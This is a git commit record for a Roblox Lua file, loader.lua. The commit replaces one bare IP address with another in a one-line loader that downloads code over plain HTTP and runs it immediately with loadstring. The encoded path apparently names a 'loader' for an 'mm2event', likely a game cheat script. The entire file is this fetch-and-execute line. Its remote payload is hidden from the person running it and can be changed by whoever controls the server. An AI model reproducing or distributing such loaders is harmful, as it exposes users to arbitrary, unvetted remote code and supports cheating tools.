2dec2c16ddb235cc0d0f74ec2a0116ccb0ed4c03
rysscripts <ryan.dhudwarr@gmail.com>
2026-02-23 17:49:22 +0000

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjQzOTJlN2VkLTY5MTQtNDMxMC1hNWQ0LWZlZjNlNWQ1M2NkNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjQzOTJlN2VkLTY5MTQtNDMxMC1hNWQ0LWZlZjNlNWQ1M2NkNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
